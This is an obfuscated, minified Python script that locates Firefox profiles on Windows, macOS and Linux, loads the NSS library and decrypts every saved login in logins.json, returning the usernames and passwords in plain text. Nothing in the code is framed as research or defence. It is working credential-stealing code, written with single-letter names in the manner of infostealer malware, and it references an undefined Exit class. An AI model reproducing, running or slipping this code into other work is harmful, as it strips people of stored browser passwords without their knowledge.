N='Darwin'
M='Windows'
H='encType'
G='password'
E='username'
F=None
import os as A,sys,json,locale as O,configparser as P
from base64 import b64decode as Q
from ctypes import Structure as R,c_uint as I,c_void_p,c_char_p as S,cast,pointer as C,CDLL,string_at as T
from ctypes.util import find_library
import shutil as U
B=O.getpreferredencoding()
import platform as V
D=V.system()
J=sys.maxsize>2**32
class K(R):
	_fields_=[('type',I),('data',S),('len',I)]
	def decode_data(A):C=T(A.data,A.len);return C.decode(B)
def W():
	S='~/.nix-profile/lib';R='/opt/local/lib';Q='/usr/lib/nss';P='/usr/lib';O='/usr/lib64/nss';L='/usr/lib64';I='/opt/local/lib/nss';H='/usr/local/lib';G='/usr/local/lib/nss';C=''
	if D==M:
		E='nss3.dll';B=[C,A.path.expanduser('~\\AppData\\Local\\Mozilla Firefox'),A.path.expanduser('~\\AppData\\Local\\Firefox Developer Edition'),A.path.expanduser('~\\AppData\\Local\\Mozilla Thunderbird'),A.path.expanduser('~\\AppData\\Local\\Nightly'),A.path.expanduser('~\\AppData\\Local\\SeaMonkey'),A.path.expanduser('~\\AppData\\Local\\Waterfox'),'C:\\Program Files\\Mozilla Firefox','C:\\Program Files\\Firefox Developer Edition','C:\\Program Files\\Mozilla Thunderbird','C:\\Program Files\\Nightly','C:\\Program Files\\SeaMonkey','C:\\Program Files\\Waterfox']
		if not J:B=[C,'C:\\Program Files (x86)\\Mozilla Firefox','C:\\Program Files (x86)\\Firefox Developer Edition','C:\\Program Files (x86)\\Mozilla Thunderbird','C:\\Program Files (x86)\\Nightly','C:\\Program Files (x86)\\SeaMonkey','C:\\Program Files (x86)\\Waterfox']+B
		T=['firefox','thunderbird','waterfox','seamonkey']
		for V in T:
			K=U.which(V)
			if K is not F:W=A.path.join(A.path.dirname(K),E);B.append(W)
	elif D==N:E='libnss3.dylib';B=C,G,H,I,'/sw/lib/firefox','/sw/lib/mozilla','/usr/local/opt/nss/lib','/opt/pkg/lib/nss','/Applications/Firefox.app/Contents/MacOS','/Applications/Thunderbird.app/Contents/MacOS','/Applications/SeaMonkey.app/Contents/MacOS','/Applications/Waterfox.app/Contents/MacOS'
	else:
		E='libnss3.so'
		if J:B=C,L,O,P,Q,H,G,R,I,A.path.expanduser(S)
		else:B=C,P,Q,'/usr/lib32','/usr/lib32/nss',L,O,H,G,R,I,A.path.expanduser(S)
	return X(B,E)
def X(locations,nssname):
	F='PATH';G=[];C=M,N
	for B in locations:
		E=A.path.join(B,nssname)
		if D in C:
			A.environ[F]=';'.join([B,A.environ[F]])
			if B:
				if not A.path.isdir(B):continue
				H=A.getcwd();A.chdir(B)
		try:I=CDLL(E)
		except OSError as J:G.append((E,str(J)))
		else:return I
		finally:
			if D in C and B:A.chdir(H)
	else:raise Exit(Exit.FAIL_LOCATE_NSS)
def L(libnss,encrypted):
	B=libnss;D=Q(encrypted);E=K(0,D,len(D));A=K(0,F,0);B.PK11SDR_Decrypt(C(E),C(A),F)
	try:return A.decode_data()
	finally:B.SECITEM_ZfreeItem(C(A),0)
def Y(basepath):
	D=basepath;E=A.path.join(D,'profiles.ini')
	if not A.path.isfile(E):return[]
	C=P.ConfigParser();C.read(E,encoding=B);F=[]
	for G in C.sections():
		if G.startswith('Profile'):H=A.path.join(D,C.get(G,'Path'));F.append(H)
	return F
def Z(profile):
	C=A.path.join(profile,'logins.json')
	if not A.path.isfile(C):return[]
	with open(C,'r',encoding=B)as D:F=json.load(D)
	return[{'url':A['hostname'],E:A['encryptedUsername'],G:A['encryptedPassword'],H:A[H]}for A in F['logins']]
def a(profile):
	D=profile;C=W();C.NSS_Init(D.encode(B));F=Z(D)
	for A in F:
		if A[H]:A[E]=L(C,A[E]);A[G]=L(C,A[G])
	C.NSS_Shutdown();return F
def f_main():
	if A.name=='nt':B=A.path.join(A.environ['APPDATA'],'Mozilla','Firefox')
	elif A.name=='posix':B=A.path.expanduser('~/.mozilla/firefox')
	else:raise Exception(f"Unsupported operating system: {A.name}")
	D=Y(B);C=[]
	for E in D:F=a(E);C.extend(F)
	return C